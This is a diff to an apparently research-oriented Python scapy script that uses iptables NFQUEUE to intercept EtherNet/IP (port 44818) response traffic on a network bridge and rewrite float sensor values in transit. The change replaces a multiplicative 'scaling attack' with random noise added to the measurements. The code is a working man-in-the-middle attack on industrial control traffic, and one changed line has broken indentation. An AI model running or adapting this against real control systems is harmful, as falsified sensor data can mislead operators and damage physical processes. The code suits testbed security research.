@@ -5,6 +5,7 @@ import os
 import binascii
 import struct
 import sys
+import random
 from scapy.all import *
 
 print("Remember - bridge must already be started!")
@@ -14,14 +15,6 @@ os.system("iptables -F")
 os.system("iptables -F -t nat")
 #os.system("iptables -A FORWARD -p tcp --dport 44818 -j NFQUEUE --queue-num 1") # Request (Read||Write)
 os.system("iptables -A FORWARD -p tcp --sport 44818 -j NFQUEUE --queue-num 1") # Response
-scaling_factor = 0.001
-type_of_scaling = sys.argv[2]
-print(type_of_scaling)
-if type_of_scaling == '+':
-    scaling_factor = 1*scaling_factor
-else:
-    scaling_factor = -1*scaling_factor
-print(scaling_factor)
 
 def modify(packet):
     pkt = IP(packet.get_payload())
@@ -33,8 +26,7 @@ def modify(packet):
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                 payload = mydata[-8:]
                 val = struct.unpack("<f", binascii.unhexlify(payload))[0]
-                #scaling attack
-                scaled = (1+scaling_factor)*val
+                scaled = val + random.uniform(0,1) #Random value between 0 and 1 added to sensor measurments
                 newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                 pkt[Raw].load = newdata.decode('hex')
                 del pkt[IP].chksum
@@ -48,8 +40,7 @@ def modify(packet):
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                 payload = mydata[-8:]
                 val = struct.unpack("<f", binascii.unhexlify(payload))[0]
-                #scaling attack
-                scaled = (1+0.001)*val
+                scaled = val + random.uniform(0,1)
                 newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                 pkt[Raw].load = newdata.decode('hex')
                 del pkt[IP].chksum
@@ -63,8 +54,7 @@ def modify(packet):
                 	mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                 	payload = mydata[-8:]
                 	val = struct.unpack("<f", binascii.unhexlify(payload))[0]
-                	#scaling attack
-                	scaled = (1+0.001)*val
+                        scaled = val + random.uniform(0,1)
                 	newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                 	pkt[Raw].load = newdata.decode('hex')
                 	del pkt[IP].chksum
